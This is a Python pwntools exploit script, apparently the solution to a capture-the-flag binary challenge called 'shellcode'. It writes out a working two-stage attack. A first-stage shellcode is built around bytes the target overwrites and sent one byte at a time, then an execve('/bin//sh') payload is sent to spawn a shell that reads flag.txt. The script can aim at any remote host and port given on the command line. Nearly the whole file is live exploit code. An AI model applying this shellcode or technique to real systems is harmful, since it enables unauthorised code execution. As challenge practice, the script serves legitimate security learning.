#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('shellcode')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
piebase
breakrva 0xaf3
breakrva 0xb4d
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def dumpit(shellc):
    print('shellcode length: {:d} bytes'.format(len(shellc)))
    print('\n\"\\x{}\"'.format('\\x'.join([format(b, '02x') for b in bytearray(shellc)])))
    print("\nunsigned char shellc[] = {{{}}};".format(", ".join([format(b, '#02x') for b in bytearray(shellc)])))
    print(disasm(shellc))

def solve():
    sc = asm("""
             mov byte ptr [rdx+9], 0x90
             nop
             nop
             mov rsi, rdx
             nop
             syscall
             call rsi
             
    """)

    sc = bytearray(sc.ljust(20, b'\x90'))
    
    for i in range(4, 20, 5):
        sc[i] = 0x90

    print(dumpit(sc))

    # write a single random byte at buf[i] where i is 4, 9, 14, 19
    j = 0
    idx = 0

    while j < 4:
        for i in range(4):
            io.send(bytes([sc[idx]]))
            idx += 1
        
        idx += 1
        j += 1

    sh = asm("""
        movabs rax, 0x68732f2f6e69622f
        lea rdi, [rdx+0x300]
        mov qword ptr [rdi], rax
        xor rax, rax
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x3b
        syscall
        """)
    
    sh = b'\x90'*20 + sh

    try:
        io.sendline(sh)
        io.sendline("cat flag.txt")
        io.interactive()
    except EOFError:
        io.close()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

